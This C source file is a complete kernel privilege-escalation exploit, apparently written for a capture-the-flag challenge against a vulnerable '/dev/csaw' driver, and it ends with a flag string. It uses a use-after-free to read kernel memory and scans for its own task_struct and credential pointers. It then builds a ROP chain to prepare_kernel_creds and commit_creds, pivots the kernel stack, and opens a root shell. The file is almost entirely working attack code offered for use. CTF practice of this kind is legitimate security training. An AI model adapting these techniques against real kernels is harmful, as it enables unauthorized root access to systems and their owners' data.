#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/syscall.h>

#define PAGE_SIZE getpagesize()
#define BUF_SIZE 32 * PAGE_SIZE

#define TASK_COMM_LEN 16

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

#define CHECK(x) ({ int64_t __res = (x); if(__res == -1) { error(#x); } __res; })

#define KERN_USUAL_BASE (0xFFFFFFFF81000000ULL)

struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void error ( char *msg )
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void hexdump ( char *addr, unsigned int length )
{
    unsigned int i, j;

    for ( i = 0; i < length / 16; i++ )
    {
        for ( j = 0; j < 16; j++ )
        {
            printf("%02hhx ", addr[i * 16 + j]);
        }
        printf("\n");
    }
}

int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigned int size )
{
    int ret;
    struct seek_channel_args seek_channel;
    struct read_channel_args read_channel;

    memset(&seek_channel, 0, sizeof(seek_channel));
    seek_channel.id = id;
    seek_channel.index = kaddr - 0x10;
    seek_channel.whence = SEEK_SET;

    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    memset(&read_channel, 0, sizeof(read_channel));
    read_channel.id = id;
    read_channel.buf = buf;
    read_channel.count = size;

    ret = ioctl(fd, CSAW_READ_CHANNEL, &read_channel);

    return ret;
}

int alloc_channel(int fd, size_t size) {
    struct alloc_channel_args args = {
        .buf_size = size,
    };
    int ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &args);
    if ( ret < 0 )
        return ret;
    return args.id;
}

int open_channel(int fd, int id) {
    struct open_channel_args args = {
        .id = id,
    };
    return ioctl(fd, CSAW_OPEN_CHANNEL, &args);
}

int close_channel(int fd, int id) {
    struct close_channel_args args = {
        .id = id,
    };
    return ioctl(fd, CSAW_CLOSE_CHANNEL, &args);
}

int grow_channel(int fd, int id, size_t size) {
    struct grow_channel_args args = {
        .id = id,
        .size = size,
    };
    return ioctl(fd, CSAW_GROW_CHANNEL, &args);
}

int shrink_channel(int fd, int id, size_t size) {
    struct shrink_channel_args args = {
        .id = id,
        .size = size,
    };
    return ioctl(fd, CSAW_SHRINK_CHANNEL, &args);
}

int read_channel(int fd, int id, void *buf, size_t count) {
    struct read_channel_args args = {
        .id = id,
        .buf = buf,
        .count = count,
    };
    return ioctl(fd, CSAW_READ_CHANNEL, &args);
}

int seek_channel(int fd, loff_t index) {
    /* id is ignored */
    struct seek_channel_args args = {
        .index = index,
        .whence = SEEK_SET,
    };
    return ioctl(fd, CSAW_SEEK_CHANNEL, &args);
}

static uintptr_t g_cred;
static uintptr_t g_kbase;

uintptr_t find_comm(char *addr, void *comm, size_t commsize) {
    char *ceiling = addr + BUF_SIZE;
    /* Scan for the comm signature in chunk */

    unsigned long *search = (unsigned long *)addr;

    while ( (unsigned long)search < (unsigned long)ceiling ) {
        search = memmem(search, (unsigned long)ceiling - (unsigned long)search, comm, commsize);

        if ( search == NULL )
            break;

        printf("\ncandidate: %08zx\n", (char *)search - addr);
        //hexdump(addr, BUF_SIZE);

        if ( (search[-2] > 0xff00000000000000ULL) && (search[-1] > 0xff00000000000000ULL ) ) {
            unsigned long real_cred, cred, init_nsproxy;

            real_cred = search[-2];
            cred = search[-1];
            init_nsproxy = search[8];

            printf("read_cred = %p\n", (void *)real_cred);
            printf("cred = %p\n", (void *)cred);
            printf("init_nsproxy = %p\n", (void *)init_nsproxy);

            g_cred = cred;
            g_kbase = init_nsproxy - (0xFFFFFFFF81C2B5C0ULL - KERN_USUAL_BASE);
            return cred;
        }

        search = (unsigned long *)((char *)search + commsize);
    }
    return 0;
}

uintptr_t find_cred(int fd, int id, uintptr_t hint, void *comm, size_t commsize) {
    char *addr = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if(addr == MAP_FAILED) {
        error("mmap");
    }

    int ret;

    printf("Mapped buffer %p:0x%x\n", addr, BUF_SIZE);
    printf("Scanning kernel memory for signature...\n");

    /*
     * We escalate to root by modifying our cred struct in memory.  We first
     * find it by leaking kernel memory one chunk at a time and applying a
     * simple heuristic.
     *
     * Pointers to our creds reside next to the user-controllable comm field in
     * task_struct:
     *
     *     const struct cred __rcu *real_cred;
     *     const struct cred __rcu *cred;
     *     char comm[TASK_COMM_LEN];
     *
     * Scan memory for our unique comm string, then verify that the two prior
     * qwords look like kernel pointers.
     */

    for(uintptr_t offset = 0; offset < 0x100000; offset++) {
        uintptr_t kaddr;
        int print = (offset & 0xf) == 0;

        if(print) printf("\r");
        int bad = 0;

        kaddr = hint - offset * BUF_SIZE;
        ret = read_kernel_memory(fd, id, kaddr, addr, BUF_SIZE);
        if(ret < 0) {
            if(print) printf("B %zx ", kaddr);
            bad++;
        } else {
            if(print) printf("G %zx ", kaddr);
            uintptr_t res = find_comm(addr, comm, commsize);
            if(res)
                return res;
        }

        kaddr = hint + offset * BUF_SIZE;
        ret = read_kernel_memory(fd, id, kaddr, addr, BUF_SIZE);
        if(ret < 0) {
            if(print) printf("B %zx ", kaddr);
            bad++;
        } else {
            if(print) printf("G %zx ", kaddr);
            uintptr_t res = find_comm(addr, comm, commsize);
            if(res)
                return res;
        }

        if(print) fflush(stdout);
        if(bad == 2)
            break;
    }
    return 0;
}

uintptr_t find_kernmem(int fd, int id, uintptr_t hint, void *needle, size_t needlesize) {
    char *addr = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if(addr == MAP_FAILED) {
        error("mmap");
    }

    int ret;

    printf("Mapped buffer %p:0x%x\n", addr, BUF_SIZE);
    printf("Scanning kernel memory for signature...\n");

    for(uintptr_t offset = 0; offset < 0x100000; offset++) {
        uintptr_t kaddr;
        int print = (offset & 0xf) == 0;

        if(print) printf("\r");
        int bad = 0;

        kaddr = hint - offset * BUF_SIZE;
        ret = read_kernel_memory(fd, id, kaddr, addr, BUF_SIZE);
        if(ret < 0) {
            if(print) printf("B %zx ", kaddr);
            bad++;
        } else {
            if(print) printf("G %zx ", kaddr);
            char *res = memmem(addr, BUF_SIZE, needle, needlesize);
            if(res)
                return (uintptr_t)(res - addr) + kaddr;
        }

        kaddr = hint + offset * BUF_SIZE;
        ret = read_kernel_memory(fd, id, kaddr, addr, BUF_SIZE);
        if(ret < 0) {
            if(print) printf("B %zx ", kaddr);
            bad++;
        } else {
            if(print) printf("G %zx ", kaddr);
            char *res = memmem(addr, BUF_SIZE, needle, needlesize);
            if(res)
                return (uintptr_t)(res - addr) + kaddr;
        }

        if(print) fflush(stdout);
        if(bad == 2)
            break;
    }
    return 0;
}

void gen_rand_str ( char *str, unsigned int len )
{
    unsigned int i;

    for ( i = 0; i < (len - 1); i++ )
        str[i] = (rand() % (0x7e - 0x20)) + 0x20;

    str[len - 1] = 0;
}

char *alternate_stack;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long user_cs;

void runshell(void) {
    write(1, "I love cheese\n", 14);
    char *args[] = { "/bin/sh", "-i", NULL };
    execve(args[0], args, NULL);
}

void get_iret_frame(void) {
    asm (
      "movq %%cs, %0\t\n"
      "movq %%ss, %1\t\n"
      "pushfq\t\n"
      "popq %2\t\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      : : "memory");
}

int main ( int argc, char **argv )
{
    int ret, fd, fd2, fd3, id, id2;
    char comm[TASK_COMM_LEN];
    char buffer[32];

    printf("Press enter to run exploit: ");
    getchar();

    /* Set comm to random signature */
    srand(time(NULL));

    gen_rand_str(comm, sizeof(comm));

    printf("Generated comm signature: '%s'\n", comm);

    CHECK(prctl(PR_SET_NAME, comm));

    /* Open devices */
    fd = CHECK(open("/dev/csaw", O_RDONLY));
    fd2 = CHECK(open("/dev/csaw", O_RDONLY));
    fd3 = CHECK(open("/dev/csaw", O_RDONLY));

    /* alloc two channels and free one of them */
    id = CHECK(alloc_channel(fd, 1));
    id2 = CHECK(alloc_channel(fd2, 1));
    CHECK(close_channel(fd, id));

    /* leak id struct using id2 */
    CHECK(grow_channel(fd2, id2, 30));

    memset(buffer, 0, sizeof(buffer));
    CHECK(read_channel(fd2, id2, buffer, 31));
    hexdump(buffer, sizeof(buffer));

    /* shrink channel so it has buf = ZERO, bufsize = -1 */
    shrink_channel(fd2, id2, 32);

    /* Map buffer for leaking kernel memory to */
    uintptr_t heap_ptr = *(uintptr_t *)&buffer[8];
    uintptr_t task_ptr = find_cred(fd2, id2, heap_ptr, comm, strlen(comm));

    printf("\ncred=0x%lx base=0x%lx\n", g_cred, g_kbase);

    /* phase 2: exploit time */
    int pipefds[2];
    CHECK(pipe(pipefds));

    /* place ropchain into memory */
    char buf[0x2000];
    gen_rand_str(buf, 64);

    alternate_stack = (char *) buf + 4096;
    get_iret_frame();

    uint64_t *rop = (uint64_t *)&buf[64];
    *rop++ = 0xffffffff81207f1f - KERN_USUAL_BASE + g_kbase; /* pop rdi ; pop rbp ; ret*/
    *rop++ = 0; /* rdi = 0 */
    *rop++ = 0; /* rbp */
    *rop++ = 0xFFFFFFFF81063D60 - KERN_USUAL_BASE + g_kbase; /* prepare_kernel_creds */
    *rop++ = 0xffffffff81036366 - KERN_USUAL_BASE + g_kbase; /* pop rcx ; ret */
    *rop++ = 0xFFFFFFFF81063B70 - KERN_USUAL_BASE + g_kbase; /* rcx = commit_creds */
    *rop++ = 0xffffffff811439fc - KERN_USUAL_BASE + g_kbase; /* mov rdi, rax ; call rcx ; pop rbp ; ret*/
    *rop++ = 0; /* rbp */
    *rop++ = 0xFFFFFFFF8160008D - KERN_USUAL_BASE + g_kbase; /* syscall return */
    *rop++ = 0; /* r15 */
    *rop++ = 0; /* r14 */
    *rop++ = 0; /* r13 */
    *rop++ = 0; /* r12 */
    *rop++ = 0; /* rbp */
    *rop++ = 0; /* rbx */
    *rop++ = 0; /* r11 */
    *rop++ = 0; /* r10 */
    *rop++ = 0; /* r9 */
    *rop++ = 0; /* r8 */
    *rop++ = 0; /* retval */
    *rop++ = 0; /* rcx */
    *rop++ = 0; /* rdx */
    *rop++ = 0; /* rsi */
    *rop++ = 0; /* rdi */
    *rop++ = 0; /* rax */
    *rop++ = (uintptr_t)&runshell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = (uintptr_t)alternate_stack;
    *rop++ = user_ss;

    write(pipefds[1], buf, sizeof(buf));
    uintptr_t kbuf = find_kernmem(fd2, id2, heap_ptr, buf, 128);
    printf("kbuf=0x%lx\n", kbuf);

    /* uaf exploit */
    id = CHECK(alloc_channel(fd, 1));
    CHECK(open_channel(fd3, id));
    CHECK(close_channel(fd, id));

    /* fd3 is now dangling */
    int pfd = CHECK(open("/proc/self/comm", O_RDONLY));
    /* pfd should call single_open, which should kmalloc single_ops right into freed struct */

    /* we control r10 on entry */
    /* lea rsp, qword [r10-0x08] ; ret */
    uintptr_t gadget = 0xffffffff81008bcc - KERN_USUAL_BASE + g_kbase;
    CHECK(seek_channel(fd3, gadget));

    uintptr_t r10 = kbuf + 64 + 8;

    /* n.b. no read will actually happen, this is just to keep kernel happy */
    char readbuf[64];
    int readsize = 64;

    /* read */
    int syscallno = 0;

    __asm__ __volatile__ (
        "mov %%r10, %%rbx\n"
        "mov %%rcx, %%r10\n"
        "syscall\n"
        "mov %%rbx, %%r10\n"
        : : "a"(syscallno), "c"(r10), "D"(pfd), "S"(readbuf), "d"(readsize) : "%rbx", "memory" );

    runshell();

    return 0;
}

/* TWCTF{r34d4b13_1s_en0ugh???} */
